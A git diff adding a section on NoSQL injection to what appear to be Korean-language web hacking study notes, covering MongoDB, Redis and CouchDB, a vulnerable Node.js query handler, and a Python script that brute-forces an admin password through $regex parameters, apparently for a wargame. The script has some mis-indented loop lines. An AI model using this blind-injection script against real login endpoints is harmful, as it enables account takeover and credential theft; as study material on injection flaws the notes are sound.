@@ -668,8 +668,99 @@ def _find_password(self, user: str, pw_len: int) -> str:
 	return pw
 ```
 
+## NoSQL Injection
+
+NRDBMS 비관계형 데이터베이스
+다양한 DBMS가 존재함
+- Redis, Dynamo, CouchDB, MongoDB 등
+- 각각의 구조와 사용 문법을 익혀야 함
+
+**MongoDB**
+특징
+1. 스키마를 따로 정의하지 않아 각 컬렉션(Collection)에 대한 정의가 필요하지 않음
+2. JSON 형식으로 쿼리를 작성할 수 있음
+3. id 필드가 Primary Key 역할을 함
+https://www.mongodb.com/docs/manual/
+
+**Redis**
+키-값(Key-Value)의 쌍을 가진 데이터 저장
+메모리 기반의 DBMS
+- 읽고 쓰는 작업이 빠름
+- 다양한 서비스에서 임시 데이터를 캐싱하는 용도로 주로 사용함
+https://redis.io/commands/
+
+**CouchDB**
+MongoDB와 같이 JSON 형태인 도큐먼트(Document)를 저장
+- REST API 형식으로 요청 처리
+https://docs.couchdb.org/en/latest/api/index.html
+
+ex) MongoDB NoSQL injection
+```node
+app.post('/query', function(req,res) { 
+	db.collection('user').find({
+		'uid': req.body.uid,
+		'upw': req.body.upw 
+	}).toArray(function(err, result) {
+		if (err) throw err;
+		res.send(result);
+	});
+});
+```
+![nosql-injection](images/Pasted%20image%2020230827213833.png)
+
+ex) MongoDB Blind NoSQL injection
+1) 비밀번호 길이 찾기
+![find-length](images/Pasted%20image%2020230827214835.png)
+2) 비밀번호 대입
+![](images/Pasted%20image%2020230827214925.png)
 
 
+NoSQL Injection 워게임은 SQL injection과 방식은 같음
+- 각 데이터베이스의 구조와 사용 문법을 익히거나 매뉴얼을 잘 검색해야할 듯
+
+```python
+import requests
+
+def main():
+	base_url = ''
+	url = f'{base_url}/login?'
+	length = 0
+	uid = 'ad.in'
+
+	# find length
+	for i in range(1000):
+		upw = f"D.{{{i}}}"
+		q = f'uid[$regex]={uid}&upw[$regex]={upw}'
+		res = requests.get(url+q).text
+		if res != "admin":
+			length = i
+			break
+
+	# alphanumeric
+	lst = []
+	for ch_idx in range(ord('0'), ord('9')+1):
+	lst.append(chr(ch_idx))
+	for ch_idx in range(ord('a'), ord('z')+1):
+	lst.append(chr(ch_idx))
+	for ch_idx in range(ord('A'), ord('Z')+1):
+	lst.append(chr(ch_idx))
+	  
+	# find flag
+	flag = ''
+	for i in range(length):
+		for ch in lst:
+			upw = f"D.\{{"+flag+ch
+			q = f'uid[$regex]={uid}&upw[$regex]={upw}'
+			res = requests.get(url+q).text
+			
+			if res == "admin":
+				flag += ch
+				break
+	print(flag)
+  
+if __name__ == "__main__":
+	main()
+```
 
 ## Command Injection
 
